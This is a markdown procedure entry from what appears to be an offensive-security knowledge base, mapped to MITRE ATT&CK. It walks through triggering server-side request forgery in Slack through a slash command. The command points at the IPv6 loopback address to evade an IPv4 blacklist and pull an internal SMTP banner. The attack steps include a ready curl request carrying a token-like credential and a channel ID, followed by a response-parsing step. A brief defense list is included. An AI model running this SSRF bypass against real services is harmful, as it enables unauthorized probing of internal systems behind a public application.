---
tags:
  - ssrf
  - ipv6
  - slack
  - execution
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
commands:
  - '[[commands/execute-slack-ssrf-command]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
updated_at: '2025-12-14T04:08:48.370Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 7133b46f-7e73-431d-a2bc-e0198f9638f8
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
---
# Execute-Slack-Slash-Command-to-Trigger-SSRF

## Summary

This procedure executes a pre-configured Slack slash command to trigger an SSRF request to an internal IPv6 loopback endpoint, retrieving responses from services like SMTP on port 25 for reconnaissance.

## Description

After configuring the slash command URL, invoking /ssrf via the chat.command API causes Slack's backend to fetch the malicious URL. Since IPv6 loopback [::] evades the IPv4 blacklist, the backend connects to local services. This reveals internal banners and enables protocol probing. Requires a valid OAuth token and channel ID.

## Requirements

1. Pre-configured slash command with IPv6 URL
2. Valid Slack OAuth token (xoxs-...)
3. Target channel ID (e.g., C04QDFHLT)

## Defense

Defensive measures and detection strategies:

- Log and alert on slash command executions with internal URL fetches
- Implement response validation to block non-HTTP responses from integrations
- Rate-limit integration API calls

## Objectives

1. Trigger backend SSRF to internal port 25
2. Capture SMTP banner for service confirmation
3. Validate IPv6 bypass effectiveness

## Instructions

### Step 1: Invoke the Slash Command

**Context**: Use the API to simulate command execution in a channel, triggering the backend fetch.

**Command** ([[commands/execute-slack-ssrf-command]]):
```bash
curl -X POST https://agarri.slack.com/api/chat.command?t=1431286754 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "agent=webapp&command=/ssrf&text=&channel=C04QDFHLT&token=xoxs-4829527689-4829527691-4814341714-d0346ec616&set_active=true&_attempts=1"
```

> This POST to chat.command executes /ssrf, resulting in a 200 OK JSON with the SMTP response embedded. Look for the Postfix banner in the 'response' field.

### Step 2: Analyze Response

**Context**: Parse the JSON output to extract internal service data.

**Command** (JSON parsing, e.g., via jq):
```bash
curl ... | jq '.response'
```

> Expected: "220 squid3.tinyspeck.com ESMTP Postfix\r\n..." indicating successful SSRF.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Active Scanning]]

### Sub-Techniques

- None

## Commands Used

- [[commands/execute-slack-ssrf-command]]

## Tools Used

- None

## Tags

- [[ssrf]]
- [[ipv6]]
- [[slack]]
